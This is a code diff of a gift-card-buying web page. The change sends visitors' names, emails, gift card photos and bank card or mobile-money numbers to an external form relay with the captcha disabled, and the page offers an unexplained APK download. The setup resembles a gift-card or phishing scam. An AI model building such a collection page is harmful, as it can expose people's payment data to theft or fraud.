@@ -8,7 +8,6 @@
 <style>
 body{margin:0;font-family:Arial;text-align:center;background:linear-gradient(180deg,#1d4ed8,#22c55e,#facc15,#f97316);}
 
-/*  Header corrigé (espace ajouté à droite) */
 header{
 background:#1d4ed8;
 color:white;
@@ -31,7 +30,6 @@ button{background:#16a34a;color:white;border:none;padding:15px;width:100%;font-s
 .upload{border:2px dashed green;padding:20px;border-radius:10px;margin:10px 0;background:white;}
 footer{background:#1d4ed8;color:white;padding:20px;margin-top:20px;}
 
-/*  WhatsApp corrigé */
 .whatsapp{
 position:fixed;
 bottom:25px;
@@ -64,40 +62,6 @@ function showPayment(){
   if(method=="orange") document.getElementById("orange").style.display="block";
   if(method=="card") document.getElementById("card").style.display="block";
 }
-
-function langFR(){
-  document.getElementById("title").innerText="Nous achetons vos cartes cadeaux instantanément";
-  document.getElementById("downloadApp").innerText=" Télécharger l'application";
-  document.getElementById("sell").innerText="Vendre ma carte cadeau";
-  document.getElementById("commission").innerText="10% commission";
-  document.getElementById("btn").innerText="Vendre";
-  document.getElementById("name").placeholder="Nom";
-  document.getElementById("firstname").placeholder="Prénom";
-  document.getElementById("email").placeholder="Email";
-  document.getElementById("value").placeholder="Valeur de la carte";
-  document.getElementById("paypalInput").placeholder="Lien PayPal";
-  document.getElementById("momoInput").placeholder="Numéro MoMo";
-  document.getElementById("orangeInput").placeholder="Numéro Orange Money";
-  document.getElementById("cardInput").placeholder="Numéro carte bancaire";
-  document.getElementById("clients").innerText=" Plus de 1500 clients satisfaits";
-}
-
-function langEN(){
-  document.getElementById("title").innerText="We buy your gift cards instantly";
-  document.getElementById("downloadApp").innerText=" Download App";
-  document.getElementById("sell").innerText="Sell my gift card";
-  document.getElementById("commission").innerText="10% commission";
-  document.getElementById("btn").innerText="Sell";
-  document.getElementById("name").placeholder="Name";
-  document.getElementById("firstname").placeholder="First name";
-  document.getElementById("email").placeholder="Email";
-  document.getElementById("value").placeholder="Card value";
-  document.getElementById("paypalInput").placeholder="PayPal payment link";
-  document.getElementById("momoInput").placeholder="MoMo number";
-  document.getElementById("orangeInput").placeholder="Orange Money number";
-  document.getElementById("cardInput").placeholder="Bank card number";
-  document.getElementById("clients").innerText=" Over 1500 satisfied clients";
-}
 </script>
 
 </head>
@@ -107,14 +71,14 @@ function langEN(){
 <header>
 CardCash Agency Instant
 <div class="lang">
-<img src="https://flagcdn.com/w40/fr.png" onclick="langFR()">
-<img src="https://flagcdn.com/w40/gb.png" onclick="langEN()">
+<img src="https://flagcdn.com/w40/fr.png">
+<img src="https://flagcdn.com/w40/gb.png">
 </div>
 </header>
 
-<h1 id="title">We buy your gift cards instantly</h1>
+<h1>We buy your gift cards instantly</h1>
 
-<a id="downloadApp" class="download" href="app.apk" download>
+<a class="download" href="app.apk" download>
  Download App
 </a>
 
@@ -125,21 +89,25 @@ CardCash Agency Instant
 <img src="https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg">
 </div>
 
-<div class="counter" id="clients">
+<div class="counter">
  Over 1500 satisfied clients
 </div>
 
-<h2 id="sell">Sell my gift card</h2>
+<h2>Sell my gift card</h2>
 
-<p id="commission">10% commission</p>
+<p>10% commission</p>
 
-<form>
-<input type="text" id="name" placeholder="Name">
-<input type="text" id="firstname" placeholder="First name">
-<input type="email" id="email" placeholder="Email">
-<input type="number" id="value" placeholder="Card value">
+<!-- ✅ FORMULAIRE EMAIL -->
+<form action="https://formspree.io/f/xreyepdr" method="POST">
 
-<select id="payment" onchange="showPayment()">
+<input type="hidden" name="_captcha" value="false">
+
+<input type="text" name="name" id="name" placeholder="Name">
+<input type="text" name="firstname" id="firstname" placeholder="First name">
+<input type="email" name="email" id="email" placeholder="Email">
+<input type="number" name="value" id="value" placeholder="Card value">
+
+<select name="payment" id="payment" onchange="showPayment()">
 <option>Choose payment method</option>
 <option value="paypal">PayPal</option>
 <option value="momo">MoMo</option>
@@ -148,27 +116,27 @@ CardCash Agency Instant
 </select>
 
 <div id="paypal" style="display:none">
-<input type="text" id="paypalInput" placeholder="PayPal payment link">
+<input type="text" name="paypal" placeholder="PayPal payment link">
 </div>
 
 <div id="momo" style="display:none">
-<input type="text" id="momoInput" placeholder="MoMo number">
+<input type="text" name="momo" placeholder="MoMo number">
 </div>
 
 <div id="orange" style="display:none">
-<input type="text" id="orangeInput" placeholder="Orange Money number">
+<input type="text" name="orange" placeholder="Orange Money number">
 </div>
 
 <div id="card" style="display:none">
-<input type="text" id="cardInput" placeholder="Bank card number">
+<input type="text" name="card" placeholder="Bank card number">
 </div>
 
 <div class="upload">
  Upload gift card photo
-<input type="file">
+<input type="file" name="file">
 </div>
 
-<button id="btn">Sell</button>
+<button type="submit">Sell</button>
 </form>
 
 <footer>
